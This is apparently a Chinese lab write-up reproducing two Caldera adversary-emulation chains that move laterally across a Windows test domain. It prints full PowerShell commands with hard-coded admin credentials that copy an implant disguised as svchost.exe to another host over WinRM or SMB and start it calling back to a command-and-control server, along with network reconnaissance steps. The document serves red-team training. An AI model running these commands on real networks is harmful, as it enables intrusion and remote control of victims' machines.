> 接下来复现windows worm#2 和 windows worm#3 两条经典链，这里就不介绍Caldera的使用了，可以看上一篇文章。

## windows worm #2

### 环境

  * win2012(已上线) 172.29.2.215

  * win2016(AD) 172.29.3.66

域：worm.lab

域管账号密码：

  * administrator

  * zxcasdqwe123!@#

win2012本地管理员账户密码：

  * administrator

  * zxcasdqwe123!@#

### 执行顺序

![image.png](https://image.3001.net/images/20221111/1668163579_636e27fbab61c5bc82968.png!small)

### 1.Collect ARP details

通过 **arp -a** 命令收集内网信息：

![image.png](https://image.3001.net/images/20221111/1668163590_636e2806c30a303e45fbb.png!small)

### 2.Reverse nslookup IP

根据上一步收集到的 ip 信息，一步一步进行DNS解析，使用的是 **nslookup** 命令：

![image.png](https://image.3001.net/images/20221111/1668163677_636e285de79990c43d17c.png!small)

![image.png](https://image.3001.net/images/20221111/1668163684_636e28642014731fd9c4a.png!small)

输出结果：fqdn会保存，后面有用

![image.png](https://image.3001.net/images/20221111/1668163693_636e286d837ea1c903443.png!small)

### 3.Copy 54ndc47 (WinRM and SCP)

看一下给出的命令：

    
    
    $job = Start-Job -ScriptBlock {
      $username = "#{domain.user.name}";
      $password = "#{domain.user.password}";
      $secstr = New-Object -TypeName System.Security.SecureString;
      $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
      $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
      $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
      $location = "#{location}";
      $exe = "#{exe_name}";
      Copy-Item $location -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
      Start-Sleep -s 5;
      Remove-PSSession -Session $session;
    };
    Receive-Job -Job $job -Wait;
    

大概步骤：

  * 使用目标账号密码与其建立会话

  * 上传木马文件到已上线机器

  * 复制木马文件到目标机器

  * 移除会话

前提条件：

  * domain.user.name 域用户名。注意：这里是域用户名，格式应当为： **域名\域用户**

  * domain.user.password 即域用户的密码

  * remote.host.name 目标主机名

  * 双方都需要开 **WinRM**

剩下的变量会自动填写

报错：

    
    
    A parameter cannot be found that matches parameter name 'ToSession'.
        + CategoryInfo          : InvalidArgument: (:) [Copy-Item], ParameterBindi 
       ngException
        + FullyQualifiedErrorId : NamedParameterNotFound,Microsoft.PowerShell.Comm 
       ands.CopyItemCommand
        + PSComputerName        : localhost
    

是powershell版本太低的原因，copy命令没有`ToSession`参数

把powershell升级到5+

https://download.microsoft.com/download/6/F/5/6F5FF66C-6775-42B0-86C4-47D41F2DA187/Win8.1AndW2K12R2-KB3191564-x64.msu

打这个补丁再重启即可

这里踩了个坑：

因为升级powershell的原因，各种操作，把原来powershell的环境变量移除了，导致重新执行TTP的时候，第一步完之后，第二步骤就无法执行了。一直在找原因，还重新装了caldera,最后在abilities选项里面发现：

![image.png](https://image.3001.net/images/20221111/1668163715_636e2883814a7293acb40.png!small)

这个ability默认只设置了powershell，必须要用powershell执行，很是郁闷。。。

最终执行的命令：

    
    
    $job = Start-Job -ScriptBlock {
        $username = "worm\administrator";
        $password = "zxcasdqwe123!@#";
        $secstr = New-Object -TypeName System.Security.SecureString;
        $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
        $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr; 	 $session = New-PSSession -ComputerName "win2016" -Credential $cred; 
        $location = "C:\Users\Public\splunkd.exe";
        $exe = "splunkd.exe";
        Copy-Item $location -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
        Start-Sleep -s 5;
        Remove-PSSession -Session $session;
    };
    Receive-Job -Job $job -Wait;
    

可以看到成功传输了文件

![image.png](https://image.3001.net/images/20221111/1668163723_636e288b9b705cc813cdb.png!small)

### 4.Start Agent (WinRM)

这一步启动Agent

给出的命令：

    
    
    $username = "#{domain.user.name}";
    $password = "#{domain.user.password}";
    $secstr = New-Object -TypeName System.Security.SecureString;
    $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
    $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
    $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
    Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\Users\Public\svchost.exe -server #{server} }};
    Start-Sleep -s 5;
    Remove-PSSession -Session $session;
    

执行过程与上一步类似，建立会话之后直接执行命令运行木马文件

前提条件：

  * domain.user.name 域用户名。注意：这里格式应当为： **域名\域用户**

  * domain.user.password 即域用户的密码

  * remote.host.name 目标主机名

  * 双方都需要开 **WinRM**

最终执行的命令：

    
    
    $username = "worm\administrator";
    $password = "zxcasdqwe123!@#";
    $secstr = New-Object -TypeName System.Security.SecureString;$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
    $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
    $session = New-PSSession -ComputerName win2016 -Credential $cred;
    Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\Users\Public\svchost.exe -server http://172.29.2.129:8888 }};
    Start-Sleep -s 5;
    Remove-PSSession -Session $session;
    

成功上线：

![image.png](https://image.3001.net/images/20221111/1668163737_636e2899311337ff955b9.png!small)

## windows worm#3

和windows worm#2很像，很多重复步骤

### 环境

  * win2012(已上线) 172.29.2.215

  * win2016(AD) 172.29.3.66

域：worm.lab

域管账号密码：

  * administrator

  * zxcasdqwe123!@#

win2012本地管理员账户密码：

  * administrator

  * zxcasdqwe123!@#

### 执行顺序

![image.png](https://image.3001.net/images/20221111/1668163762_636e28b20cfac3db9d7aa.png!small)

### 1.Collect ARP details

通过 **arp -a** 命令收集内网信息：

![image.png](https://image.3001.net/images/20221111/1668163772_636e28bc7cd788700aa99.png!small)

### 2.Reverse nslookup IP

根据上一步收集到的 ip 信息，一步一步进行DNS解析，使用的是 **nslookup** 命令：

![image.png](https://image.3001.net/images/20221111/1668163780_636e28c454bbecf15111d.png!small)

![image.png](https://image.3001.net/images/20221111/1668163785_636e28c9e6f58d1e85d1b.png!small)

输出结果：会保存fqdn，后面有用

![image.png](https://image.3001.net/images/20221111/1668163793_636e28d1ee2fa05c180a8.png!small)

### 3.View remote shares

查看远程共享，使用了net view命令,使用了上一步骤保存的 **fqdn**

![image.png](https://image.3001.net/images/20221111/1668163803_636e28db7969fb19da76a.png!small)!![image.png](https://image.3001.net/images/20221111/1668163812_636e28e476df9544b67b3.png!small)

使用 **net view** 命令时，如果是本地账户，会自动使用当前缓存的密码进行NTLM认证，域内账户则会使用Kerberos认证。

### 4.Copy 54ndc47 (SMB)

使用了命令：

    
    
    $path = "sandcat.go-windows";
    $drive = "\\win2016.worm.lab\C$";
    Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
    

这一步先上传`sandcat.go-windows`到以上线的机器，再让其自动使用自身缓存密码复制木马文件到目标

前提条件：

  * 知道目标共享路径

  * 目标开启SMB服务 （默认开启）

### 5.Start Agent (WinRM)

看一下给出的命令：

    
    
    $username = "#{domain.user.name}";
    $password = "#{domain.user.password}";
    $secstr = New-Object -TypeName System.Security.SecureString;
    $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
    $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
    $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
    Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\Users\Public\svchost.exe -server #{server} }};
    Start-Sleep -s 5;
    Remove-PSSession -Session $session;
    

大概步骤：

  * 使用目标账号密码与其建立会话

  * 执行上一步传输过去的后门文件

  * 移除会话

前提条件：

  * username 用户名。注意：这里是域用户名，格式应当为： **域名\域用户**

  * password 即username的密码

  * remote.host.name 目标主机名

  * 双方都需要开 **WinRM**

遇到的问题：

  1. 由于这一步是手动添加的Command,在执行这一条命令的时候一直报错

    
    
    $session = New-PSSession -ComputerName win2016 -Credential $cred;
    

![image.png](https://image.3001.net/images/20221111/1668163826_636e28f246bca9f623ea9.png!small)

最开始并不知道$username的格式，以为是WinRM出了问题。后来再确认WinRM没问题之后，猜测是$cred参数出错。后翻阅Micros文档：https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.2

看到如下示例：

    
    
    New-PSSession -Session $s -Credential Domain01\User01
    

经测试，果然是$username格式问题,Domain为域名,User为域用户名。

  2. 紧接着下一条命令是执行文件上线，给出的如下：

    
    
    Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\Users\Public\svchost.exe -server #{server} }};
    

使用了之后并没反应，发现里面很奇怪的是：`C:\Users\Public\svchost.exe`该文件根本就不存在，上一步copy的文件也并不是这个名，且后面的`server`参数明明是传过去的后门文件使用的。所以猜测它搞错了。。。改成上一步copy的`s4ndc4t.exe`即可。

最终命令

    
    
    $username = "worm\administrator";
    $password = "zxcasdqwe123!@#";
    $secstr = New-Object -TypeName System.Security.SecureString;
    $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
    $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
    $session = New-PSSession -ComputerName win2016 -Credential $cred;
    Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\Users\Public\s4ndc4t.exe -server http://172.29.2.129:8888 }};
    Start-Sleep -s 5;
    Remove-PSSession -Session $session;
    

成功上线受害机器win2016

![image.png](https://image.3001.net/images/20221111/1668163834_636e28fa39a5e955df0bc.png!small)

